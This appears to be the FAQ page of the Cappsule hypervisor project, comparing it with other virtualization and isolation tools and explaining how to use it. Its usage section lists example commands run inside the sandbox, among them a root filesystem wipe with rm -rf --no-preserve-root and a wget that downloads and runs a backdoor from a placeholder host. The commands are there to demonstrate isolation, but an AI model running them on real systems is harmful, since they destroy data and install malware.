---
layout: page
title: FAQ
permalink: /faq/
---

## What's the difference between Cappsule and other hypervisors?

Traditional virtualization solutions (e.g.: VMware, Xen, KVM) virtualize whole operating systems (such as Windows or Linux), whereas Cappsule virtualizes a running system. VMs launched by Cappsule don't go through the boot step; they start directly on a running kernel. This particular feature allows an instantaneous launch of VMs. One can think of VMs as forks of the host operating system. In fact, the VMs' kernel is a copy of the running host kernel. Another particularity is that no VM disk image is required. There's no need to setup, configure, install, manage and keep new VMs up-to-date. The host filesystem is accessible as Copy-on-Write (with respect to a whitelist of files and folders accessible in read-only or read-write mode).



## Why Cappsule hypervisor is considered secure?

Every software has security bugs, and Cappsule is no exception. But it is developed from scratch, with the main goal of being secure. With less than 15K lines of code, the attack surface is extremely narrowed in comparison to mainstream hypervisors. Moreover, anything that isn't vital for the VMs isn't implemented and certain classes of attacks simply don't exist. For example, there's no way to access hardware (through I/O memory, I/O ports, or DMA). Also, there's no need of instruction emulation: vulnerabilities such as XSA-105 are thus impossible.



## How transparent is it?

Just prefix your commands with `virt exec`:

 * `virt exec bash`
 * `virt exec firefox`
 * `virt exec vlc random-cat-movie-downloaded-on-the-internet.avi`
 * `sudo virt exec rm -rf --no-preserve-root /`
 * `virt exec bash -c "wget http://evil.ninja/backdoor && chmod +x backdoor && sudo ./backdoor"`

That's it.

Some miscellaneous options are available to specify policies and shared folders, and a few commands help to manage running cappsules and retrieve information:

 * `virt ps`
 * `virt kill 4`
 * `virt attach 3`



## What's the difference with project X?

### Qubes OS

The projects don't share the very same goal. Qubes OS is an amazing project whose developers pushed end user security a step ahead, and it protects against a broader panel of attacks than Cappsule (e.g. malicious firmware, buggy Wi-Fi or USB stack). Nevertheless, the main OS needs to be reinstalled, and users have to learn how to use this new system. Regarding security, Xen's history is disastrous but recent [hardware virtualization requirement](https://www.qubes-os.org/news/2016/07/21/new-hw-certification-for-q4/) should improve that issue.


### Subgraph OS

Subgraph OS is another promising project. While I haven't tested it, it doesn't seem to use hardware virtualization, but instead relies on Linux namespaces and SECCOMP to ensure the isolation of applications.


### Docker

Docker isn't meant for security. While a lot of improvements have been made recently in this area, it also relies on Linux namespaces and SECCOMP to ensure container isolation. A single kernel vulnerability allows an attacker to compromise the host. On this topic, the chapter 7 (*Understanding Container Threats*) of NCC Group Whitepaper [Understanding and Hardening Linux Containers](https://www.nccgroup.trust/us/our-research/understanding-and-hardening-linux-containers/) is a must-read.



## Error messages

 * *Client error: cannot connect to cappsule server.* Is the daemon running (`/usr/local/cappsule/usr/bin/daemon`)?



## Is there a bug bounty?

Obviously. Here are the [rewards](/bugbounty).
